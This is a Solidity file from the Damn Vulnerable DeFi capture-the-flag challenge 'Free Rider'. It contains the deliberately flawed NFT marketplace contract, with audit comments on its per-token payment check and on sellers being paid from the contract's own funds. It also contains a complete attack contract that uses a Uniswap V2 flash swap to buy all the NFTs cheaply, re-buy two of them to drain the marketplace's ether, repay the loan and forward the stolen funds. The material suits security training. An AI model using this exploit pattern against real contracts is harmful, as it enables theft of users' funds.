// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount; ) {
            _token.safeMint(msg.sender);
            unchecked { ++i; }
        }
        token = _token;
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0)
            revert InvalidTokensAmount();
            
        if (amount != prices.length)
            revert InvalidPricesAmount();

        for (uint256 i = 0; i < amount;) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0)
            revert InvalidPrice();

        if (msg.sender != _token.ownerOf(tokenId))
            revert CallerNotOwner(tokenId);

        if (_token.getApproved(tokenId) != address(this) && !_token.isApprovedForAll(msg.sender, address(this)))
            revert InvalidApproval();

        offers[tokenId] = price;

        assembly { // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length;) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0)
            revert TokenNotOffered(tokenId);

        //@audit doesn't check total sum needed to buy all tokens, just checks msg.value
        // attacker can buy all tokens by sending msg.value equal to the highest price
        // of all the tokens. This challenge has 6 tokens 15eth each, to buy all would cost
        // 90eth, but one can buy them all for 15eth
        if (msg.value < priceToPay)
            revert InsufficientPayment();

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        //@audit the marketplace sends its own ether to pay the token owners, so it will
        // drain its own place due to not checking msg.value >= total price of all nfts 

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}


// interfaces that attack contract needs
interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address recipient, uint amount) external returns (bool);
    function withdraw(uint) external;
}

//
// @audit 
// a) FreeRiderNFTMarketplace.buyMany() calls _buyOne() which checks msg.value
// against each nft, not against the total sum it would cost to buy all the ids
// submitted to buyMany(). This lets attacker buy all nfts by only paying for
// most expensive one.
//
// b) FreeRiderNFTMarketplace._buyOne() pays nft owner from marketplace ether,
// therefore attacker can drain market ether by buying, offering & re-buying
// the same nfts!
//
// Market starts with 6 nfts costing 15 ether and market has 90 ether
// Uniswap V2 WETH/DVT pool available
//
contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {

    FreeRiderNFTMarketplace market;
    IUniswapV2Pair          uniswapV2Pair;
    address                 recoveryAddr;
    address                 playerAddr;
    uint256 constant        LOAN_AMOUNT = 31 ether;

    constructor(address payable _market, address _uniswapV2Pair, address _recoveryAddr, address _playerAddr) {
        market        = FreeRiderNFTMarketplace(_market);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        recoveryAddr  = _recoveryAddr;
        playerAddr    = _playerAddr;
    }

    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol
    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        // 1) Use UniswapV2 flash swap to get a flash loan for LOAN_AMOUNT
        // perform a flash swap (uniswapv2 version of flash loan)
        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
        uniswapV2Pair.swap(LOAN_AMOUNT, 0, address(this), hex"00");
    }

        // 2) uniswapv2 flash swap will call this function
    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        IWETH weth = IWETH(uniswapV2Pair.token0());

        weth.withdraw(LOAN_AMOUNT);

        // 3) Buy 6 nfts for 15 ether => Market will have 90+15-(6*15) = 15 ether left
        uint256[] memory nftIds = new uint256[](6);
        for(uint8 i=0; i<6;) {
            nftIds[i] = i;
            ++i;
        }

        market.buyMany{value: 15 ether}(nftIds);
    
        // 4) Offer 2 nfts for 15 ether each : Market has 15 ether left
        market.token().setApprovalForAll(address(market), true);
        uint256[] memory nftIds2 = new uint256[](2);
        uint256[] memory prices  = new uint256[](2);
        for(uint8 i=0; i<2;) {
            nftIds2[i] = i;
            prices[i]  = 15 ether;
            ++i;        
        }

        market.offerMany(nftIds2, prices);

        // 5) Buy them both for 15 ether => Market will have 15+15-(2*15) = 0 ether left
        market.buyMany{value: 15 ether}(nftIds2);
       
        // forward bought nfts to recovery address to receive eth reward
        // must include player/attacker address as bytes memory data parameter
        // since FreeRiderRecovery.onERC721Received() will decode this
        // and send reward to it
        DamnValuableNFT nft = DamnValuableNFT(market.token());
        for (uint8 i=0; i<6;) {
            nft.safeTransferFrom(address(this), recoveryAddr, i, abi.encode(playerAddr));
            ++i;
        }

        // 10. Calculate fee and pay back loan.
        uint256 fee = ((LOAN_AMOUNT * 3) / uint256(997)) + 1;
        weth.deposit{value: LOAN_AMOUNT + fee}();
        weth.transfer(address(uniswapV2Pair), LOAN_AMOUNT + fee);

        // forward eth stolen from market to attacker
        payable(playerAddr).transfer(address(this).balance);
    }

    receive() external payable {}
}
